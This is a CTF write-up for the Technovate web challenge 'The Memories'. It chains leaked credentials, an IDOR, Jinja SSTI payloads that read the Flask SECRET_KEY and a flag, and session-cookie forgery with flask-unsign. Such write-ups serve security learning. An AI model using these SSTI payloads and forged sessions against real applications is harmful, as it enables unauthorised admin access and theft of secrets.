---
link: 'writeups/technovate/technovate-web-writeup'
title: "Technovate CTF: The Memories Writeup"
description: "A multi-step web exploitation chain combining credential leakage, IDOR, SSTI, and Flask session forgery."
date: 2026-07-06 22:25:00
categories:
  - [Writeups, Technovate CTF]
tags:
  - Web Exploitation
  - IDOR
  - SSTI
  - Flask
  - Session Forgery
---

# WRITE UP: The Memories [IDOR → SSTI → Session Forgery → Admin → Flag]

- NOTE : Hints are not a part of write-up.

## Overview

This challenge demonstrates a multi-step exploitation chain combining:

- Credential leakage
- IDOR (Insecure Direct Object Reference)
- SSTI (Server-Side Template Injection)
- Flask session forgery
- SSTI (Server-Side Template Injection)

Goal: escalate from a low-privileged user (`student_7`) to `rangrez_admin` and extract the flag.

## Recon

- Checked page source and `/static/robots.txt`
- Found credentials:
  ```plain
  username: student_7
  password: holi123
  ```

## Login

Login as `student_7` to gain access to user-controlled memory.

## IDOR

Access hidden memory:

```plain
/memory/13
```

- Owned by `rangrez_admin`
- Not visible but accessible via direct reference

## SSTI Discovery

- Application renders user-controlled input via Jinja
- `student_x` users → `SandboxedEnvironment` (The CTF was set in order to restrict direct flag discovery without session forgery).
- `rangrez_admin` → full `Environment` (no sandbox)

## Secret Key Extraction

From SSTI:

```plain
{{ config['SECRET_KEY'] }}
app.secret_key = "r4ngr3z-arch1v3-k3y-2026"
```

## Session Forgery

Forge cookie:

```json
flask-unsign --sign --cookie '{"user": "rangrez_admin", "overrides": {} }' --secret 'r4ngr3z-arch1v3-k3y-2026'
{"user":"rangrez_admin","overrides":{}}
```

Sign using the secret key and replace browser cookie.

## Admin Access

Now running in **unsandboxed Jinja environment**.

## Final SSTI Payloads

### Payloads

```html
{{ self.__init__.__globals__['FLAG'] }} {{
self.__dict__._TemplateReference__context.get('FLAG') }}
```

## Flag

```plain
TCHNVTE{1d0r_plus_sst1_rang_d3_d1y4}
```
